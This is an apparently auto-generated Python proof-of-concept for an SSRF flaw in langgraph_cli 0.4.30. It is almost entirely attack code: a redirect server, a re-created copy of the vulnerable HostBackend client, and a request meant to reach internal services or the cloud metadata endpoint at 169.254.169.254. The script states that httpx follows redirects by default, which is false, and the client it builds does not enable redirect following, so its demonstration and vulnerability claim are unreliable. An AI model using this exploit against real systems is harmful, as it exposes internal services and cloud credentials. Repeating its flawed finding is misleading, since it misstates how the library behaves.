#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: ssrf-017
# Sink: __init__
# Auto-generated — run with: python3 ssrf_http_client_base_url___init.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langgraph_cli-0.4.30

Vulnerability: The HostBackend class accepts a user-controlled base_url
parameter and passes it directly to httpx.Client without any validation.
The client follows redirects by default, allowing an attacker to make
requests to internal services or cloud metadata endpoints.

This PoC demonstrates the vulnerability by:
1. Starting a simple HTTP server that redirects to an internal target
2. Creating a HostBackend instance with a malicious base_url
3. Triggering a request that follows the redirect to the internal target

Usage:
    python3 poc_ssrf.py [--target TARGET] [--listen-port PORT]

    --target: The internal URL to redirect to (default: http://127.0.0.1:8080/admin)
    --listen-port: Port for the redirect server (default: 9999)

Example:
    python3 poc_ssrf.py --target http://169.254.169.254/latest/meta-data/
"""

import argparse
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

# We need httpx for the vulnerable client
try:
    import httpx
except ImportError:
    print("[-] httpx is required. Install with: pip install httpx")
    sys.exit(1)


class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that redirects all requests to the target URL."""
    
    def do_GET(self):
        """Handle GET requests by sending a 302 redirect."""
        self.send_response(302)
        self.send_header('Location', self.server.target_url)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


class RedirectServer:
    """Simple HTTP server that redirects all requests to a target URL."""
    
    def __init__(self, target_url: str, listen_port: int = 9999):
        self.target_url = target_url
        self.listen_port = listen_port
        self.server = None
        self.thread = None
    
    def start(self):
        """Start the redirect server in a background thread."""
        self.server = HTTPServer(('0.0.0.0', self.listen_port), RedirectHandler)
        self.server.target_url = self.target_url
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        print(f"[+] Redirect server started on port {self.listen_port}")
        print(f"[+] Redirecting all requests to: {self.target_url}")
    
    def stop(self):
        """Stop the redirect server."""
        if self.server:
            self.server.shutdown()
            self.thread.join(timeout=2)
            print("[+] Redirect server stopped")


class HostBackend:
    """
    Simplified version of the vulnerable HostBackend class.
    This mirrors the vulnerable code from langgraph_cli-0.4.30.
    """
    
    def __init__(self, base_url: str, api_key: str = "test-key", tenant_id: str = None):
        """
        Initialize the client with a user-controlled base_url.
        This is the vulnerable entry point - no validation of base_url.
        """
        if not base_url:
            raise ValueError("Host backend URL is required")
        
        transport = httpx.HTTPTransport(retries=3)
        headers = {
            "X-Api-Key": api_key,
            "Accept": "application/json",
        }
        if tenant_id:
            headers["X-Tenant-ID"] = tenant_id
        
        # VULNERABLE: base_url is used directly without validation
        self._base_url = base_url.rstrip("/")
        self._client = httpx.Client(
            base_url=self._base_url,
            headers=headers,
            transport=transport,
            timeout=30,
        )
        print(f"[+] Created HostBackend with base_url: {self._base_url}")
    
    def make_request(self, path: str = "/"):
        """Make a request to demonstrate the SSRF."""
        try:
            print(f"[*] Making request to: {self._base_url}{path}")
            response = self._client.get(path)
            print(f"[+] Response status: {response.status_code}")
            print(f"[+] Response headers: {dict(response.headers)}")
            print(f"[+] Response body (first 500 chars): {response.text[:500]}")
            return response
        except httpx.ConnectError as e:
            print(f"[-] Connection error: {e}")
        except httpx.TimeoutException as e:
            print(f"[-] Timeout: {e}")
        except Exception as e:
            print(f"[-] Error: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="SSRF PoC for langgraph_cli-0.4.30"
    )
    parser.add_argument(
        "--target",
        default="http://127.0.0.1:8080/admin",
        help="Internal target URL to redirect to (default: http://127.0.0.1:8080/admin)"
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=9999,
        help="Port for the redirect server (default: 9999)"
    )
    args = parser.parse_args()
    
    # Start the redirect server
    redirect_server = RedirectServer(args.target, args.listen_port)
    redirect_server.start()
    
    # Give the server a moment to start
    time.sleep(0.5)
    
    # Create the vulnerable client pointing to our redirect server
    # This simulates an attacker controlling the base_url parameter
    attacker_url = f"http://127.0.0.1:{args.listen_port}"
    print(f"\n[*] Creating vulnerable client with attacker-controlled URL: {attacker_url}")
    
    try:
        backend = HostBackend(base_url=attacker_url)
        
        # Make a request - this will follow the redirect to the internal target
        print("\n[*] Triggering SSRF via redirect...")
        backend.make_request("/test")
        
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
    finally:
        redirect_server.stop()


if __name__ == "__main__":
    print("=" * 60)
    print("SSRF Proof-of-Concept for langgraph_cli-0.4.30")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates SSRF via redirect following")
    print("[*] The vulnerable client follows redirects by default")
    print("[*] An attacker can redirect to internal services")
    print()
    
    main()
